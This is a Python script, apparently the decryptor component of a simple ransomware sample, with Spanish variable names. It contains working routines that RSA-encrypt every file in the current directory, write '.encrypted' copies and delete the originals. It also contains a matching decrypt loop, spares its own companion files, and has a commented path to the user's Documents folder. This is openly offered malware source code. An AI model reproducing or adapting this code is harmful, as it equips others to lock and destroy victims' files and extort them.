import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from Cryptodome.Cipher import AES
from getpass import getuser
from tkinter import *
from tkinter import messagebox as MessageBox

TAM_KEY=2048

def generar_key():
    private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=TAM_KEY,
    backend=default_backend()
    )
    return private_key
def encriptar_bytes(cadena,public_key):
    cifrado = public_key.encrypt(
    cadena,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
        )
    )
    return cifrado


def desencriptar_bytes(cadena,private_key): 
    descifrado = private_key.decrypt(
        cadena,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return descifrado
def encriptar_archivo(x,public_key):
    leer = open(x,'rb')
    escribir = open(x+'.encrypted','wb')

    tam = os.path.getsize(x) 
    print("Tamaño archivo",tam)
    sobrantes = tam % 128
    bloques_enteros = int((tam-sobrantes)/128)
    print("bloques enteros:",bloques_enteros,"sobrante(bytes):",sobrantes)

    for i in range(bloques_enteros):
        buffer=leer.read(128)
        buffer=encriptar_bytes(buffer,public_key)
        #print(buffer)
        escribir.write(buffer)
    buffer=leer.read(sobrantes)
    buffer=encriptar_bytes(buffer,public_key)
    escribir.write(buffer)
        
    escribir.close()
    leer.close()
    os.remove(x)

    
def desencriptar_archivo(x,private_key):
    tam_bloque=256
    leer = open(x,'rb')
    escribir = open(x.removesuffix('.encrypted'),'wb')

    tam = os.path.getsize(x) 
    print("Tamaño archivo",tam)
    sobrantes = tam % tam_bloque
    bloques_enteros = int((tam-sobrantes)/tam_bloque)
    print("bloques enteros:",bloques_enteros,"sobrante(bytes):",sobrantes)

    for i in range(bloques_enteros):
        buffer=leer.read(tam_bloque)
        buffer=desencriptar_bytes(buffer,private_key)
        #print(buffer)
        escribir.write(buffer)
    if(sobrantes!=0):
        buffer=leer.read(sobrantes)
        buffer=desencriptar_bytes(buffer,private_key)
        escribir.write(buffer)
        
    escribir.close()  
    leer.close()
    os.remove(x)

def save_key(pk, filename):
    pem = pk.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    with open(filename, 'wb') as pem_out:
        pem_out.write(pem)

def load_key(filename):
    with open(filename, 'rb') as pem_in:
        pemlines = pem_in.read()
    private_key = load_pem_private_key(pemlines, None, default_backend())
    return private_key


PRIVATE_KEY=load_key('priv.pem')
PUBLIC_KEY=PRIVATE_KEY.public_key()

user = getuser()
#path = 'C:/Users' + '/' + user + '/Documents'
archivos = os.listdir()
#print(path)

for i in archivos:
    if(i!='priv.pem' and i!='cifrador.py' and i!='descifrador.py'and i!='logo.png'):
        #print(archivos)
        #encriptar_archivo(i,PUBLIC_KEY)
        desencriptar_archivo(i,PRIVATE_KEY)




